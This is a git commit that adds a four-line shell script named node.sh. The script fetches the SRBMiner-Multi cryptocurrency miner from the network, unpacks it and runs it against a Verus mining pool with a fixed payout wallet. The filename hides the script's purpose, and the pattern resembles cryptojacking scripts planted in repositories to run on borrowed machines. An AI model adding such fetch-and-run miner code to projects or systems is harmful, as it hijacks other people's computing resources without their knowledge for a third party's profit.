4f072778afc7f2c8d83fbb761c4ee3951af18f4b
dnqjwdz <100903992+dnqjwdz@users.noreply.github.com>
2022-05-03 12:06:05 +0700

    Create node.sh

---
+++ node.sh
@@ -0,0 +1,4 @@
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.1/SRBMiner-Multi-0-9-1-Linux.tar.xz
+tar xf SRBMiner-Multi-0-9-1-Linux.tar.xz
+cd SRBMiner-Multi-0-9-1
+./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool vrsc.ciscotech.dk:9999 --wallet RC1cM3E6qp34rJtem8fdvkfVQFVPL8pM4V
